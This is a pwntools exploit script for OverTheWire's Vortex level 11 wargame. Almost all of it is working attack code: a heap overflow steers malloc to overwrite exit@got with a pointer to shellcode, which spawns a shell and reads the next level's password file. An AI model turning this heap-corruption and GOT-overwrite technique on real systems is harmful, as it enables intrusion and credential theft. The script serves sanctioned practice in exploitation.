#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
context(arch='i386',os='linux')

level    = 11
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)

# By rebuilding the program and watching return values
# from imalloc (and what's being memset())
# we see that if we overflow with a cyclic pattern,
# at offset 'naau' we can control the result of the
# last allocation.
#
# We can also see that the allocation addresses don't change.
#
# memset(0x804d020, d0, 20)
# ===> MALLOC 14 == 0x804d020
# memset(0x804d040, d0, 20)
# ===> MALLOC 14 == 0x804d040
# memset(0x804e000, d0, 800)
# ===> MALLOC 800 == 0x804e000
# memset(0x804f030, d0, 10)
# ===> MALLOC 10 == 0x804f030
# memset(0x804e800, d0, 800)
# ===> MALLOC 800 == 0x804e800
# memset(0x7561616e, d0, 616f) # oaau
# ===> MALLOC 10 == 0x7561616e
e = ELF(chal)
exit  = e.got['exit']
heap  = 0x804e800 + 1      # <-- Add 1 so that we don't have NUL byte
arg1  = cyclic(0x800)      # <-- Up to the buffer edge
arg1  += p32(0xdeadbeef)   # <-- Ignored
arg1  += p32(exit - 0x40)  # <-- Value returned by malloc().
                           #     No idea what the 0x40 is about
arg2  = p32(heap) + '\x00' # <-- Value to overwrite exit() with

# Put our shellcode at the beginning of the allocation
sc    =  '\x90'                # <-- Pad 1 byte due to above
sc    += asm(shellcraft.sh())
arg1  = sc + arg1[len(sc):]

log.info("heap     %x" % heap)
log.info("exit@got %x" % exit)

# Win
sh = shell.run("%s $%r $%r" % (binary, arg1, arg2))
sh.clean(2)

sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
